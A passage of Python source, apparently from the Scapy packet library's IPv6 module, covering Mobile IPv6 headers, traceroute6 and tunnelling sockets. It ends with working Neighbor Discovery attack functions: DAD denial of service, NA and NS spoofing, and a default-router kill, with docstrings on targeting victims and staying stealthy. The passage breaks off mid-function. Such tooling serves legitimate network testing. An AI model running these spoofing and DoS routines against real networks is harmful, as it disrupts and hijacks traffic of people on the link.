
class MIP6OptCareOfTest(_MIP6OptAlign, Packet): # RFC 4866 (Sect. 5.5)
    name = "MIPv6 option - Care-of Test"
    fields_desc = [ ByteEnumField("otype", 16, _mobopttypes),
                    FieldLenField("olen", None, length_of="cokt", fmt="B"),
                    StrLenField("cokt", b'\x00'*8,
                                length_from = lambda pkt: pkt.olen) ]
    x = 0 ; y = 0 # alignment requirement: none

class MIP6OptUnknown(_MIP6OptAlign, Packet):
    name = 'Scapy6 - Unknown Mobility Option'
    fields_desc = [ ByteEnumField("otype", 6, _mobopttypes),
                    FieldLenField("olen", None, length_of="odata", fmt="B"),
                    StrLenField("odata", "",
                                length_from = lambda pkt: pkt.olen) ]
    x = 0 ; y = 0 # alignment requirement: none

moboptcls = {  0: Pad1,
               1: PadN,
               2: MIP6OptBRAdvice,
               3: MIP6OptAltCoA,
               4: MIP6OptNonceIndices,
               5: MIP6OptBindingAuthData,
               6: MIP6OptMobNetPrefix,
               7: MIP6OptLLAddr,
               8: MIP6OptMNID,
               9: MIP6OptMsgAuth,
              10: MIP6OptReplayProtection,
              11: MIP6OptCGAParamsReq,
              12: MIP6OptCGAParams,
              13: MIP6OptSignature,
              14: MIP6OptHomeKeygenToken,
              15: MIP6OptCareOfTestInit,
              16: MIP6OptCareOfTest }


# Main Mobile IPv6 Classes

mhtypes = {  0: 'BRR',
             1: 'HoTI',
             2: 'CoTI',
             3: 'HoT',
             4: 'CoT',
             5: 'BU',
             6: 'BA',
             7: 'BE',
             8: 'Fast BU',
             9: 'Fast BA',
            10: 'Fast NA' }

# From http://www.iana.org/assignments/mobility-parameters
bastatus = {   0: 'Binding Update accepted',
               1: 'Accepted but prefix discovery necessary',
             128: 'Reason unspecified',
             129: 'Administratively prohibited',
             130: 'Insufficient resources',
             131: 'Home registration not supported',
             132: 'Not home subnet',
             133: 'Not home agent for this mobile node',
             134: 'Duplicate Address Detection failed',
             135: 'Sequence number out of window',
             136: 'Expired home nonce index',
             137: 'Expired care-of nonce index',
             138: 'Expired nonces',
             139: 'Registration type change disallowed',
             140: 'Mobile Router Operation not permitted',
             141: 'Invalid Prefix',
             142: 'Not Authorized for Prefix',
             143: 'Forwarding Setup failed (prefixes missing)',
             144: 'MIPV6-ID-MISMATCH',
             145: 'MIPV6-MESG-ID-REQD',
             146: 'MIPV6-AUTH-FAIL',
             147: 'Permanent home keygen token unavailable',
             148: 'CGA and signature verification failed',
             149: 'Permanent home keygen token exists',
             150: 'Non-null home nonce index expected' }


class _MobilityHeader(Packet):
    name = 'Dummy IPv6 Mobility Header'
    overload_fields = { IPv6: { "nh": 135 }}

    def post_build(self, p, pay):
        p += pay
        l = self.len
        if self.len is None:
            l = (len(p)-8)//8
        p = chb(p[0]) + struct.pack("B", l) + chb(p[2:])
        if self.cksum is None:
            cksum = in6_chksum(135, self.underlayer, p)
        else:
            cksum = self.cksum
        p = chb(p[:4])+struct.pack("!H", cksum)+chb(p[6:])
        return p


class MIP6MH_Generic(_MobilityHeader): # Mainly for decoding of unknown msg
    name = "IPv6 Mobility Header - Generic Message"
    fields_desc = [ ByteEnumField("nh", 59, ipv6nh),
                    ByteField("len", None),
                    ByteEnumField("mhtype", None, mhtypes),
                    ByteField("res", None),
                    XShortField("cksum", None),
                    StrLenField("msg", b"\x00"*2,
                                length_from = lambda pkt: 8*pkt.len-6) ]



# TODO: make a generic _OptionsField
class _MobilityOptionsField(PacketListField):
    __slots__ = ["curpos"]
    def __init__(self, name, default, cls, curpos, count_from=None, length_from=None):
        self.curpos = curpos
        PacketListField.__init__(self, name, default, cls, count_from=count_from, length_from=length_from)

    def getfield(self, pkt, s):
        l = self.length_from(pkt)
        return s[l:],self.m2i(pkt, s[:l])

    def i2len(self, pkt, i):
        return len(self.i2m(pkt, i))

    def m2i(self, pkt, x):
        opt = []
        while x:
            o = orb(x[0]) # Option type
            cls = self.cls
            if o in moboptcls:
                cls = moboptcls[o]
            try:
                op = cls(x)
            except:
                op = self.cls(x)
            opt.append(op)
            if isinstance(op.payload, conf.raw_layer):
                x = op.payload.load
                del(op.payload)
            else:
                x = b""
        return opt

    def i2m(self, pkt, x):
        autopad = None
        try:
            autopad = getattr(pkt, "autopad") # Hack : 'autopad' phantom field
        except:
            autopad = 1

        if not autopad:
            return b"".join(map(str, x))

        curpos = self.curpos
        s = b""
        for p in x:
            d = p.alignment_delta(curpos)
            curpos += d
            if d == 1:
                s += raw(Pad1())
            elif d != 0:
                s += raw(PadN(optdata=b'\x00'*(d-2)))
            pstr = raw(p)
            curpos += len(pstr)
            s += pstr

        # Let's make the class including our option field
        # a multiple of 8 octets long
        d = curpos % 8
        if d == 0:
            return s
        d = 8 - d
        if d == 1:
            s += raw(Pad1())
        elif d != 0:
            s += raw(PadN(optdata=b'\x00'*(d-2)))

        return s

    def addfield(self, pkt, s, val):
        return s+self.i2m(pkt, val)

class MIP6MH_BRR(_MobilityHeader):
    name = "IPv6 Mobility Header - Binding Refresh Request"
    fields_desc = [ ByteEnumField("nh", 59, ipv6nh),
                    ByteField("len", None),
                    ByteEnumField("mhtype", 0, mhtypes),
                    ByteField("res", None),
                    XShortField("cksum", None),
                    ShortField("res2", None),
                    _PhantomAutoPadField("autopad", 1), # autopad activated by default
                    _MobilityOptionsField("options", [], MIP6OptUnknown, 8,
                                          length_from = lambda pkt: 8*pkt.len) ]
    overload_fields = { IPv6: { "nh": 135 } }
    def hashret(self):
        # Hack: BRR, BU and BA have the same hashret that returns the same
        #       value b"\x00\x08\x09" (concatenation of mhtypes). This is
        #       because we need match BA with BU and BU with BRR. --arno
        return b"\x00\x08\x09"

class MIP6MH_HoTI(_MobilityHeader):
    name = "IPv6 Mobility Header - Home Test Init"
    fields_desc = [ ByteEnumField("nh", 59, ipv6nh),
                    ByteField("len", None),
                    ByteEnumField("mhtype", 1, mhtypes),
                    ByteField("res", None),
                    XShortField("cksum", None),
                    StrFixedLenField("reserved", b"\x00"*2, 2),
                    StrFixedLenField("cookie", b"\x00"*8, 8),
                    _PhantomAutoPadField("autopad", 1), # autopad activated by default
                    _MobilityOptionsField("options", [], MIP6OptUnknown, 16,
                                          length_from = lambda pkt: 8*(pkt.len-1)) ]
    overload_fields = { IPv6: { "nh": 135 } }
    def hashret(self):
        return raw(self.cookie)

class MIP6MH_CoTI(MIP6MH_HoTI):
    name = "IPv6 Mobility Header - Care-of Test Init"
    mhtype = 2
    def hashret(self):
        return raw(self.cookie)

class MIP6MH_HoT(_MobilityHeader):
    name = "IPv6 Mobility Header - Home Test"
    fields_desc = [ ByteEnumField("nh", 59, ipv6nh),
                    ByteField("len", None),
                    ByteEnumField("mhtype", 3, mhtypes),
                    ByteField("res", None),
                    XShortField("cksum", None),
                    ShortField("index", None),
                    StrFixedLenField("cookie", b"\x00"*8, 8),
                    StrFixedLenField("token", b"\x00"*8, 8),
                    _PhantomAutoPadField("autopad", 1), # autopad activated by default
                    _MobilityOptionsField("options", [], MIP6OptUnknown, 24,
                                          length_from = lambda pkt: 8*(pkt.len-2)) ]
    overload_fields = { IPv6: { "nh": 135 } }
    def hashret(self):
        return raw(self.cookie)
    def answers(self, other):
        if (isinstance(other, MIP6MH_HoTI) and
            self.cookie == other.cookie):
            return 1
        return 0

class MIP6MH_CoT(MIP6MH_HoT):
    name = "IPv6 Mobility Header - Care-of Test"
    mhtype = 4
    def hashret(self):
        return raw(self.cookie)

    def answers(self, other):
        if (isinstance(other, MIP6MH_CoTI) and
            self.cookie == other.cookie):
            return 1
        return 0

class LifetimeField(ShortField):
    def i2repr(self, pkt, x):
        return "%d sec" % (4*x)

class MIP6MH_BU(_MobilityHeader):
    name = "IPv6 Mobility Header - Binding Update"
    fields_desc = [ ByteEnumField("nh", 59, ipv6nh),
                    ByteField("len", None), # unit == 8 bytes (excluding the first 8 bytes)
                    ByteEnumField("mhtype", 5, mhtypes),
                    ByteField("res", None),
                    XShortField("cksum", None),
                    XShortField("seq", None), # TODO: ShortNonceField
                    FlagsField("flags", "KHA", 7, "PRMKLHA"),
                    XBitField("reserved", 0, 9),
                    LifetimeField("mhtime", 3), # unit == 4 seconds
                    _PhantomAutoPadField("autopad", 1), # autopad activated by default
                    _MobilityOptionsField("options", [], MIP6OptUnknown, 12,
                                          length_from = lambda pkt: 8*pkt.len - 4) ]
    overload_fields = { IPv6: { "nh": 135 } }

    def hashret(self): # Hack: see comment in MIP6MH_BRR.hashret()
        return b"\x00\x08\x09"

    def answers(self, other):
        if isinstance(other, MIP6MH_BRR):
            return 1
        return 0

class MIP6MH_BA(_MobilityHeader):
    name = "IPv6 Mobility Header - Binding ACK"
    fields_desc = [ ByteEnumField("nh", 59, ipv6nh),
                    ByteField("len", None), # unit == 8 bytes (excluding the first 8 bytes)
                    ByteEnumField("mhtype", 6, mhtypes),
                    ByteField("res", None),
                    XShortField("cksum", None),
                    ByteEnumField("status", 0, bastatus),
                    FlagsField("flags", "K", 3, "PRK"),
                    XBitField("res2", None, 5),
                    XShortField("seq", None), # TODO: ShortNonceField
                    XShortField("mhtime", 0), # unit == 4 seconds
                    _PhantomAutoPadField("autopad", 1), # autopad activated by default
                    _MobilityOptionsField("options", [], MIP6OptUnknown, 12,
                                          length_from = lambda pkt: 8*pkt.len-4) ]
    overload_fields = { IPv6: { "nh": 135 }}

    def hashret(self): # Hack: see comment in MIP6MH_BRR.hashret()
        return b"\x00\x08\x09"

    def answers(self, other):
        if (isinstance(other, MIP6MH_BU) and
            other.mhtype == 5 and
            self.mhtype == 6 and
            other.flags & 0x1 and # Ack request flags is set
            self.seq == other.seq):
            return 1
        return 0

_bestatus = { 1: 'Unknown binding for Home Address destination option',
              2: 'Unrecognized MH Type value' }

# TODO: match Binding Error to its stimulus
class MIP6MH_BE(_MobilityHeader):
    name = "IPv6 Mobility Header - Binding Error"
    fields_desc = [ ByteEnumField("nh", 59, ipv6nh),
                    ByteField("len", None), # unit == 8 bytes (excluding the first 8 bytes)
                    ByteEnumField("mhtype", 7, mhtypes),
                    ByteField("res", 0),
                    XShortField("cksum", None),
                    ByteEnumField("status", 0, _bestatus),
                    ByteField("reserved", 0),
                    IP6Field("ha", "::"),
                    _MobilityOptionsField("options", [], MIP6OptUnknown, 24,
                                          length_from = lambda pkt: 8*(pkt.len-2)) ]
    overload_fields = { IPv6: { "nh": 135 }}

_mip6_mhtype2cls = { 0: MIP6MH_BRR,
                     1: MIP6MH_HoTI,
                     2: MIP6MH_CoTI,
                     3: MIP6MH_HoT,
                     4: MIP6MH_CoT,
                     5: MIP6MH_BU,
                     6: MIP6MH_BA,
                     7: MIP6MH_BE }



#############################################################################
#############################################################################
###                             Traceroute6                               ###
#############################################################################
#############################################################################

class  AS_resolver6(AS_resolver_riswhois):
    def _resolve_one(self, ip):
        """
        overloaded version to provide a Whois resolution on the
        embedded IPv4 address if the address is 6to4 or Teredo.
        Otherwise, the native IPv6 address is passed.
        """

        if in6_isaddr6to4(ip): # for 6to4, use embedded @
            tmp = inet_pton(socket.AF_INET6, ip)
            addr = inet_ntop(socket.AF_INET, tmp[2:6])
        elif in6_isaddrTeredo(ip): # for Teredo, use mapped address
            addr = teredoAddrExtractInfo(ip)[2]
        else:
            addr = ip

        _, asn, desc = AS_resolver_riswhois._resolve_one(self, addr)

        if asn.startswith("AS"):
            try:
                asn = int(asn[2:])
            except ValueError:
                pass

        return ip,asn,desc        

class TracerouteResult6(TracerouteResult):
    __slots__ = []
    def show(self):
        return self.make_table(lambda s_r: (s_r[0].sprintf("%-42s,IPv6.dst%:{TCP:tcp%TCP.dport%}{UDP:udp%UDP.dport%}{ICMPv6EchoRequest:IER}"), # TODO: ICMPv6 !
                                            s_r[0].hlim,
                                            s_r[1].sprintf("%-42s,IPv6.src% {TCP:%TCP.flags%}"+
                                                           "{ICMPv6DestUnreach:%ir,type%}{ICMPv6PacketTooBig:%ir,type%}"+
                                                           "{ICMPv6TimeExceeded:%ir,type%}{ICMPv6ParamProblem:%ir,type%}"+
                                                           "{ICMPv6EchoReply:%ir,type%}")))

    def get_trace(self):
        trace = {}

        for s,r in self.res:
            if IPv6 not in s:
                continue
            d = s[IPv6].dst
            if d not in trace:
                trace[d] = {}

            t = not (ICMPv6TimeExceeded in r or
                     ICMPv6DestUnreach in r or
                     ICMPv6PacketTooBig in r or
                     ICMPv6ParamProblem in r)

            trace[d][s[IPv6].hlim] = r[IPv6].src, t

        for k in six.itervalues(trace):
            try:
                m = min(x for x, y in six.itervalues(k) if y)
            except ValueError:
                continue
            for l in list(k):  # use list(): k is modified in the loop
                if l > m:
                    del k[l]

        return trace

    def graph(self, ASres=AS_resolver6(), **kargs):
        TracerouteResult.graph(self, ASres=ASres, **kargs)
    
@conf.commands.register
def traceroute6(target, dport=80, minttl=1, maxttl=30, sport=RandShort(), 
                l4 = None, timeout=2, verbose=None, **kargs):
    """Instant TCP traceroute using IPv6
    traceroute6(target, [maxttl=30], [dport=80], [sport=80]) -> None
    """
    if verbose is None:
        verbose = conf.verb

    if l4 is None:
        a,b = sr(IPv6(dst=target, hlim=(minttl,maxttl))/TCP(seq=RandInt(),sport=sport, dport=dport),
                 timeout=timeout, filter="icmp6 or tcp", verbose=verbose, **kargs)
    else:
        a,b = sr(IPv6(dst=target, hlim=(minttl,maxttl))/l4,
                 timeout=timeout, verbose=verbose, **kargs)

    a = TracerouteResult6(a.res)

    if verbose:
        a.display()

    return a,b

#############################################################################
#############################################################################
###                                Sockets                                ###
#############################################################################
#############################################################################

class L3RawSocket6(L3RawSocket):
    def __init__(self, type = ETH_P_IPV6, filter=None, iface=None, promisc=None, nofilter=0):
        L3RawSocket.__init__(self, type, filter, iface, promisc)
        # NOTE: if fragmentation is needed, it will be done by the kernel (RFC 2292)
        self.outs = socket.socket(socket.AF_INET6, socket.SOCK_RAW, socket.IPPROTO_RAW)
        self.ins = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.htons(type))

def IPv6inIP(dst='203.178.135.36', src=None):
  _IPv6inIP.dst = dst
  _IPv6inIP.src = src
  if not conf.L3socket == _IPv6inIP:
    _IPv6inIP.cls = conf.L3socket
  else:
    del(conf.L3socket)
  return _IPv6inIP

class _IPv6inIP(SuperSocket):
  dst = '127.0.0.1'
  src = None
  cls = None

  def __init__(self, family=socket.AF_INET6, type=socket.SOCK_STREAM, proto=0, **args):
    SuperSocket.__init__(self, family, type, proto)
    self.worker = self.cls(**args)

  def set(self, dst, src=None):
    _IPv6inIP.src = src
    _IPv6inIP.dst = dst

  def nonblock_recv(self):
    p = self.worker.nonblock_recv()
    return self._recv(p)

  def recv(self, x):
    p = self.worker.recv(x)
    return self._recv(p, x)

  def _recv(self, p, x=MTU):
    if p is None:
      return p
    elif isinstance(p, IP):
      # TODO: verify checksum
      if p.src == self.dst and p.proto == socket.IPPROTO_IPV6:
        if isinstance(p.payload, IPv6):
          return p.payload
    return p

  def send(self, x):
    return self.worker.send(IP(dst=self.dst, src=self.src, proto=socket.IPPROTO_IPV6)/x)


#############################################################################
#############################################################################
###                  Neighbor Discovery Protocol Attacks                  ###
#############################################################################
#############################################################################

def _NDP_Attack_DAD_DoS(reply_callback, iface=None, mac_src_filter=None,
                        tgt_filter=None, reply_mac=None):
    """
    Internal generic helper accepting a specific callback as first argument,
    for NS or NA reply. See the two specific functions below.
    """

    def is_request(req, mac_src_filter, tgt_filter):
        """
        Check if packet req is a request
        """

        # Those simple checks are based on Section 5.4.2 of RFC 4862
        if not (Ether in req and IPv6 in req and ICMPv6ND_NS in req):
            return 0

        # Get and compare the MAC address
        mac_src = req[Ether].src
        if mac_src_filter and mac_src != mac_src_filter:
            return 0

        # Source must be the unspecified address
        if req[IPv6].src != "::":
            return 0

        # Check destination is the link-local solicited-node multicast
        # address associated with target address in received NS
        tgt = inet_pton(socket.AF_INET6, req[ICMPv6ND_NS].tgt)
        if tgt_filter and tgt != tgt_filter:
            return 0
        received_snma = inet_pton(socket.AF_INET6, req[IPv6].dst)
        expected_snma = in6_getnsma(tgt)
        if received_snma != expected_snma:
            return 0

        return 1

    if not iface:
        iface = conf.iface

    # To prevent sniffing our own traffic
    if not reply_mac:
        reply_mac = get_if_hwaddr(iface)
    sniff_filter = "icmp6 and not ether src %s" % reply_mac

    sniff(store=0,
          filter=sniff_filter,
          lfilter=lambda x: is_request(x, mac_src_filter, tgt_filter),
          prn=lambda x: reply_callback(x, reply_mac, iface),
          iface=iface)


def NDP_Attack_DAD_DoS_via_NS(iface=None, mac_src_filter=None, tgt_filter=None,
                              reply_mac=None):
    """
    Perform the DAD DoS attack using NS described in section 4.1.3 of RFC
    3756. This is done by listening incoming NS messages sent from the
    unspecified address and sending a NS reply for the target address,
    leading the peer to believe that another node is also performing DAD
    for that address.

    By default, the fake NS sent to create the DoS uses:
     - as target address the target address found in received NS.
     - as IPv6 source address: the unspecified address (::).
     - as IPv6 destination address: the link-local solicited-node multicast
       address derived from the target address in received NS.
     - the mac address of the interface as source (or reply_mac, see below).
     - the multicast mac address derived from the solicited node multicast
       address used as IPv6 destination address.

    Following arguments can be used to change the behavior:

    iface: a specific interface (e.g. "eth0") of the system on which the
         DoS should be launched. If None is provided conf.iface is used.

    mac_src_filter: a mac address (e.g "00:13:72:8c:b5:69") to filter on.
         Only NS messages received from this source will trigger replies.
         This allows limiting the effects of the DoS to a single target by
         filtering on its mac address. The default value is None: the DoS
         is not limited to a specific mac address.

    tgt_filter: Same as previous but for a specific target IPv6 address for
         received NS. If the target address in the NS message (not the IPv6
         destination address) matches that address, then a fake reply will
         be sent, i.e. the emitter will be a target of the DoS.

    reply_mac: allow specifying a specific source mac address for the reply,
         i.e. to prevent the use of the mac address of the interface.
    """

    def ns_reply_callback(req, reply_mac, iface):
        """
        Callback that reply to a NS by sending a similar NS
        """

        # Let's build a reply and send it
        mac = req[Ether].src
        dst = req[IPv6].dst
        tgt = req[ICMPv6ND_NS].tgt
        rep = Ether(src=reply_mac)/IPv6(src="::", dst=dst)/ICMPv6ND_NS(tgt=tgt)
        sendp(rep, iface=iface, verbose=0)

        print("Reply NS for target address %s (received from %s)" % (tgt, mac))

    _NDP_Attack_DAD_DoS(ns_reply_callback, iface, mac_src_filter,
                        tgt_filter, reply_mac)


def NDP_Attack_DAD_DoS_via_NA(iface=None, mac_src_filter=None, tgt_filter=None,
                              reply_mac=None):
    """
    Perform the DAD DoS attack using NS described in section 4.1.3 of RFC
    3756. This is done by listening incoming NS messages *sent from the
    unspecified address* and sending a NA reply for the target address,
    leading the peer to believe that another node is also performing DAD
    for that address.

    By default, the fake NA sent to create the DoS uses:
     - as target address the target address found in received NS.
     - as IPv6 source address: the target address found in received NS.
     - as IPv6 destination address: the link-local solicited-node multicast
       address derived from the target address in received NS.
     - the mac address of the interface as source (or reply_mac, see below).
     - the multicast mac address derived from the solicited node multicast
       address used as IPv6 destination address.
     - A Target Link-Layer address option (ICMPv6NDOptDstLLAddr) filled
       with the mac address used as source of the NA.

    Following arguments can be used to change the behavior:

    iface: a specific interface (e.g. "eth0") of the system on which the
          DoS should be launched. If None is provided conf.iface is used.

    mac_src_filter: a mac address (e.g "00:13:72:8c:b5:69") to filter on.
         Only NS messages received from this source will trigger replies.
         This allows limiting the effects of the DoS to a single target by
         filtering on its mac address. The default value is None: the DoS
         is not limited to a specific mac address.

    tgt_filter: Same as previous but for a specific target IPv6 address for
         received NS. If the target address in the NS message (not the IPv6
         destination address) matches that address, then a fake reply will
         be sent, i.e. the emitter will be a target of the DoS.

    reply_mac: allow specifying a specific source mac address for the reply,
         i.e. to prevent the use of the mac address of the interface. This
         address will also be used in the Target Link-Layer Address option.
    """

    def na_reply_callback(req, reply_mac, iface):
        """
        Callback that reply to a NS with a NA
        """

        # Let's build a reply and send it
        mac = req[Ether].src
        dst = req[IPv6].dst
        tgt = req[ICMPv6ND_NS].tgt
        rep = Ether(src=reply_mac)/IPv6(src=tgt, dst=dst)
        rep /= ICMPv6ND_NA(tgt=tgt, S=0, R=0, O=1)
        rep /= ICMPv6NDOptDstLLAddr(lladdr=reply_mac)
        sendp(rep, iface=iface, verbose=0)

        print("Reply NA for target address %s (received from %s)" % (tgt, mac))

    _NDP_Attack_DAD_DoS(na_reply_callback, iface, mac_src_filter,
                        tgt_filter, reply_mac)


def NDP_Attack_NA_Spoofing(iface=None, mac_src_filter=None, tgt_filter=None,
                           reply_mac=None, router=False):
    """
    The main purpose of this function is to send fake Neighbor Advertisement
    messages to a victim. As the emission of unsolicited Neighbor Advertisement
    is pretty pointless (from an attacker standpoint) because it will not
    lead to a modification of a victim's neighbor cache, the function send
    advertisements in response to received NS (NS sent as part of the DAD,
    i.e. with an unspecified address as source, are not considered).

    By default, the fake NA sent to create the DoS uses:
     - as target address the target address found in received NS.
     - as IPv6 source address: the target address
     - as IPv6 destination address: the source IPv6 address of received NS
       message.
     - the mac address of the interface as source (or reply_mac, see below).
     - the source mac address of the received NS as destination macs address
       of the emitted NA.
     - A Target Link-Layer address option (ICMPv6NDOptDstLLAddr)
       filled with the mac address used as source of the NA.

    Following arguments can be used to change the behavior:

    iface: a specific interface (e.g. "eth0") of the system on which the
          DoS should be launched. If None is provided conf.iface is used.

    mac_src_filter: a mac address (e.g "00:13:72:8c:b5:69") to filter on.
         Only NS messages received from this source will trigger replies.
         This allows limiting the effects of the DoS to a single target by
         filtering on its mac address. The default value is None: the DoS
         is not limited to a specific mac address.

    tgt_filter: Same as previous but for a specific target IPv6 address for
         received NS. If the target address in the NS message (not the IPv6
         destination address) matches that address, then a fake reply will
         be sent, i.e. the emitter will be a target of the DoS.

    reply_mac: allow specifying a specific source mac address for the reply,
         i.e. to prevent the use of the mac address of the interface. This
         address will also be used in the Target Link-Layer Address option.

    router: by the default (False) the 'R' flag in the NA used for the reply
         is not set. If the parameter is set to True, the 'R' flag in the
         NA is set, advertising us as a router.

    Please, keep the following in mind when using the function: for obvious
    reasons (kernel space vs. Python speed), when the target of the address
    resolution is on the link, the sender of the NS receives 2 NA messages
    in a row, the valid one and our fake one. The second one will overwrite
    the information provided by the first one, i.e. the natural latency of
    Scapy helps here.

    In practice, on a common Ethernet link, the emission of the NA from the
    genuine target (kernel stack) usually occurs in the same millisecond as
    the receipt of the NS. The NA generated by Scapy6 will usually come after
    something 20+ ms. On a usual testbed for instance, this difference is
    sufficient to have the first data packet sent from the victim to the
    destination before it even receives our fake NA.
    """

    def is_request(req, mac_src_filter, tgt_filter):
        """
        Check if packet req is a request
        """

        # Those simple checks are based on Section 5.4.2 of RFC 4862
        if not (Ether in req and IPv6 in req and ICMPv6ND_NS in req):
            return 0

        mac_src = req[Ether].src
        if mac_src_filter and mac_src != mac_src_filter:
            return 0

        # Source must NOT be the unspecified address
        if req[IPv6].src == "::":
            return 0

        tgt = inet_pton(socket.AF_INET6, req[ICMPv6ND_NS].tgt)
        if tgt_filter and tgt != tgt_filter:
            return 0

        dst = req[IPv6].dst
        if in6_isllsnmaddr(dst): # Address is Link Layer Solicited Node mcast.

            # If this is a real address resolution NS, then the destination
            # address of the packet is the link-local solicited node multicast
            # address associated with the target of the NS.
            # Otherwise, the NS is a NUD related one, i.e. the peer is
            # unicasting the NS to check the target is still alive (L2
            # information is still in its cache and it is verified)
            received_snma = inet_pton(socket.AF_INET6, dst)
            expected_snma = in6_getnsma(tgt)
            if received_snma != expected_snma:
                print("solicited node multicast @ does not match target @!")
                return 0

        return 1

    def reply_callback(req, reply_mac, router, iface):
        """
        Callback that reply to a NS with a spoofed NA
        """

        # Let's build a reply (as defined in Section 7.2.4. of RFC 4861) and
        # send it back.
        mac = req[Ether].src
        pkt = req[IPv6]
        src = pkt.src
        tgt = req[ICMPv6ND_NS].tgt
        rep = Ether(src=reply_mac, dst=mac)/IPv6(src=tgt, dst=src)
        rep /= ICMPv6ND_NA(tgt=tgt, S=1, R=router, O=1) # target from the NS

        # "If the solicitation IP Destination Address is not a multicast
        # address, the Target Link-Layer Address option MAY be omitted"
        # Given our purpose, we always include it.
        rep /= ICMPv6NDOptDstLLAddr(lladdr=reply_mac)

        sendp(rep, iface=iface, verbose=0)

        print("Reply NA for target address %s (received from %s)" % (tgt, mac))

    if not iface:
        iface = conf.iface
    # To prevent sniffing our own traffic
    if not reply_mac:
        reply_mac = get_if_hwaddr(iface)
    sniff_filter = "icmp6 and not ether src %s" % reply_mac

    router = (router and 1) or 0 # Value of the R flags in NA

    sniff(store=0,
          filter=sniff_filter,
          lfilter=lambda x: is_request(x, mac_src_filter, tgt_filter),
          prn=lambda x: reply_callback(x, reply_mac, router, iface),
          iface=iface)


def NDP_Attack_NS_Spoofing(src_lladdr=None, src=None, target="2001:db8::1",
                           dst=None, src_mac=None, dst_mac=None, loop=True,
                           inter=1, iface=None):
    """
    The main purpose of this function is to send fake Neighbor Solicitations
    messages to a victim, in order to either create a new entry in its neighbor
    cache or update an existing one. In section 7.2.3 of RFC 4861, it is stated
    that a node SHOULD create the entry or update an existing one (if it is not
    currently performing DAD for the target of the NS). The entry's reachability
    state is set to STALE.

    The two main parameters of the function are the source link-layer address
    (carried by the Source Link-Layer Address option in the NS) and the
    source address of the packet.

    Unlike some other NDP_Attack_* function, this one is not based on a
    stimulus/response model. When called, it sends the same NS packet in loop
    every second (the default)

    Following arguments can be used to change the format of the packets:

    src_lladdr: the MAC address used in the Source Link-Layer Address option
         included in the NS packet. This is the address that the peer should
         associate in its neighbor cache with the IPv6 source address of the
         packet. If None is provided, the mac address of the interface is
         used.

    src: the IPv6 address used as source of the packet. If None is provided,
         an address associated with the emitting interface will be used
         (based on the destination address of the packet).

    target: the target address of the NS packet. If no value is provided,
         a dummy address (2001:db8::1) is used. The value of the target
         has a direct impact on the destination address of the packet if it
         is not overridden. By default, the solicited-node multicast address
         associated with the target is used as destination address of the
         packet. Consider specifying a specific destination address if you
         intend to use a target address different than the one of the victim.

    dst: The destination address of the NS. By default, the solicited node
         multicast address associated with the target address (see previous
         parameter) is used if no specific value is provided. The victim
         is not expected to check the destination address of the packet,
         so using a multicast address like ff02::1 should work if you want
         the attack to target all hosts on the link. On the contrary, if
         you want to be more stealth, you should provide the target address
         for this parameter in order for the packet to be sent only to the
         victim.

    src_mac: the MAC address used as source of the packet. By default, this
         is the address of the interface. If you want to be more stealth,
         feel free to use something else. Note that this address is not the
         that the victim will use to populate its neighbor cache.

    dst_mac: The MAC address used as destination address of the packet. If
         the IPv6 destination address is multicast (all-nodes, solicited
         node, ...), it will be computed. If the destination address is
         unicast, a neighbor solicitation will be performed to get the
         associated address. If you want the attack to be stealth, you
         can provide the MAC address using this parameter.

    loop: By default, this parameter is True, indicating that NS packets
         will be sent in loop, separated by 'inter' seconds (see below).
         When set to False, a single packet is sent.

    inter: When loop parameter is True (the default), this parameter provides
         the interval in seconds used for sending NS packets.

    iface: to force the sending interface.
    """

    if not iface:
        iface = conf.iface

    # Use provided MAC address as source link-layer address option
    # or the MAC address of the interface if none is provided.
    if not src_lladdr:
        src_lladdr = get_if_hwaddr(iface)

    # Prepare packets parameters
    ether_params = {}
    if src_mac:
        ether_params["src"] = src_mac

    if dst_mac:
        ether_params["dst"] = dst_mac

    ipv6_params = {}
    if src:
        ipv6_params["src"] = src
    if dst:
        ipv6_params["dst"] = dst
    else:
        # Compute the solicited-node multicast address
        # associated with the target address.
        tmp = inet_ntop(socket.AF_INET6,
                        in6_getnsma(inet_pton(socket.AF_INET6, target)))
        ipv6_params["dst"] = tmp

    pkt = Ether(**ether_params)
    pkt /= IPv6(**ipv6_params)
    pkt /= ICMPv6ND_NS(tgt=target)
    pkt /= ICMPv6NDOptSrcLLAddr(lladdr=src_lladdr)

    sendp(pkt, inter=inter, loop=loop, iface=iface, verbose=0)


def NDP_Attack_Kill_Default_Router(iface=None, mac_src_filter=None,
                                   ip_src_filter=None, reply_mac=None,
                                   tgt_mac=None):
    """
    The purpose of the function is to monitor incoming RA messages
    sent by default routers (RA with a non-zero Router Lifetime values)
    and invalidate them by immediately replying with fake RA messages
    advertising a zero Router Lifetime value.

    The result on receivers is that the router is immediately invalidated,
    i.e. the associated entry is discarded from the default router list
    and destination cache is updated to reflect the change.

    By default, the function considers all RA messages with a non-zero
    Router Lifetime value but provides configuration knobs to allow
    filtering RA sent by specific routers (Ethernet source address).
    With regard to emission, the multicast all-nodes address is used
    by default but a specific target can be used, in order for the DoS to
    apply only to a specific host.

    More precisely, following arguments can be used to change the behavior:

    iface: a specific interface (e.g. "eth0") of the system on which the
         DoS should be launched. If None is provided conf.iface is used.

    mac_src_filter: a mac address (e.g "00:13:72:8c:b5:69") to filter on.
         Only RA messages received from this source will trigger replies.
         If other default routers advertised their presence on the link,
         their clients will not be impacted by the attack. The default
         value is None: the DoS is not limited to a specific mac address.

    ip_src_filter: an IPv6 address (e.g. fe80::21e:bff:fe4e:3b2) to filter
         on. Only RA messages received from this source address will trigger
         replies. If other default routers advertised their presence on the
         link, their clients will not be impacted by the attack. The default
         value is None: the DoS is not limited to a specific IPv6 source
         address.

    reply_mac: allow specifying a specific source mac address for the reply,
         i.e. to prevent the use of the mac address of the interface.

    tgt_mac: allow limiting the effect of the DoS to a specific host,
         by sending the "invalidating RA" only to its mac address.
    """

    def is_request(req, mac_src_filter, ip_src_filter):
        """
        Check if packet req is a request
        """

        if not (Ether in req and IPv6 in req and ICMPv6ND_RA in req):
            return 0

        mac_src = req[Ether].src
        if mac_src_filter and mac_src != mac_src_filter:
            return 0

        ip_src = req[IPv6].src
        if ip_src_filter and ip_src != ip_src_filter:
            return 0

        # Check if this is an advertisement for a Default Router
        # by looking at Router Lifetime value
        if req[ICMPv6ND_RA].routerlifetime == 0:
            return 0

        return 1

    def ra_reply_callback(req, reply_mac, tgt_mac, iface):
        """
        Callback that sends an RA with a 0 lifetime
        """

        # Let's build a reply and send it

        src = req[IPv6].src

